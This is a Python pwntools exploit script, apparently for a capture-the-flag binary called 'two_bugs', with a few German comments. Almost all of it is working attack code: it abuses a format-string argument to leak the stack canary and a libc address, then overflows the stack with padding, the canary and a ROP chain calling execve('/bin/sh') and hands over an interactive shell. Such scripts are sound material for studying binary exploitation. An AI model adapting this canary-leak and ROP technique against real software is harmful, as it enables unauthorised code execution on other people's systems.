#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF("./two_bugs", checksec=False)
context.log_level = "error"


def start(argv=[], *a, **kw):
    gdbscript = """
    tbreak main
    continue
    """.format(
        **locals()
    )

    if args.GDB:
        context.log_level = "debug"
        context.terminal = ["tmux", "split", "-h"]
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, aslr=False, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# you can also create new functions here

def main():
    list = ['%17$p.%19$p.%21$p'] # 17 da dort canary, 18 ist saved rbp, 19 ist ret
    libc = exe.libc

    io = start(list)

    # add your exploit code here
    addresses = io.recvline(timeout=0.5)

    canary = p64(int(addresses[0:18], 16))
    libc.address = int(addresses[19:33], 16) - libc.sym["__libc_start_call_main"] - 128
    #exe.address = int(addresses[34:-1], 16) - exe.sym["main"]

    print(hex(exe.address))

    print(hex(libc.address))

    r = ROP(libc) # Problem: Base needed so bin/sh works...
    r.call('execve', ['/bin/sh\x00'])

    payload = b""   
    payload += cyclic(72) + canary
    payload += r.chain()

    print(r.dump())

    io.sendline(payload)

    io.interactive()



if __name__ == "__main__":
    main()
